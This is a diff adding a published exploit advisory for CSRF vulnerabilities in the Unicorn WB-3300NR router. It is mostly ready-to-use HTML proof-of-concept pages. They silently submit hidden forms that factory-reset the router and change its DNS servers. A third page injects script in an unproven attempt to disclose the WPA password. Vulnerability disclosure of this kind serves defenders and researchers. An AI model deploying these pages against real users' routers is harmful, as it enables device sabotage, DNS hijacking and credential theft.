@@ -1,0 +1,56 @@
+# Exploit Title:     Unicorn Router WB-3300NR CSRF (Factory Reset/DNS Change)
+# Exploit Author:    absane
+# Blog:              http://blog.noobroot.com
+# Discovery date:    October 29th 2013   
+# Vendor Homepage:   http://www.eunicorn.co.kr/kimsboard7/_product.php?inc=wb-3300nr    
+# Tested on:         Unicorn WB-3300NR v1.0
+# Firmware Version:  V5.07.18_ko_UIS02       
+
+***************
+*Vulnerability*
+***************
+The WB-3300NR Unicorn Router suffers from numerous CSRF vulnerabilities.
+Considering that by default the administrative pages do not require authentication, countless exploits exist.
+
+******************
+*Proof of Concept*
+******************
+
+1) Factory Reset
+
+<html><body>
+<iframe height=0 width=0 id="cantseeme" name="cantseeme"></iframe>
+<form name="csrf_form" action="http://192.168.123.254/goform/SysToolRestoreSet" method="post" target="cantseeme">
+<input type="hidden" name="CMD" value='SYS_CONF'>
+<input type="hidden" name="GO" value='system_reboot.asp'>
+<input type="hidden" name="CCMD" value='0'>
+<script>document.csrf_form.submit();</script>
+</body></html>
+
+
+2) Alter the DNS Settings
+
+<html><body>
+<iframe height=0 width=0 id="cantseeme" name="cantseeme"></iframe>
+<form name="csrf_form" action="http://192.168.123.254/goform/AdvSetDns" method="post" target="cantseeme">
+<input type="hidden" name="GO" value='wan_dns.asp'>
+<input type="hidden" name="rebootTag" value=''>
+<input type="hidden" name="DSEN" value='1'>
+<input type="hidden" name="DNSEN" value='on'>
+<input type="hidden" name="DS1" value='8.8.4.4'>
+<input type="hidden" name="DS2" value='8.8.8.8'>
+<script>document.csrf_form.submit();</script>
+</body></html>
+
+
+3) WPA Password Disclosure (possibility)(not proven)
+
+The following PoC code only demostrates that with CSRF and XSS, it might be possible to obtain the WPA password.
+However, I have been unable to do so without forcing the router to revert to factory defaults.
+
+<html><body>
+<iframe height=0 width=0 id="cantseeme" name="cantseeme"></iframe>
+<form name="csrf_form" action="http://192.168.123.254/goform/WizardHandle" method="post" target="cantseeme">
+<input type="hidden" name="MACC" value='"; var x = ""; function y() {alert(def_wirelesspassword);} x = window.setTimeout(y,2000);//'>
+<script>document.csrf_form.submit();</script>
+</body></html>
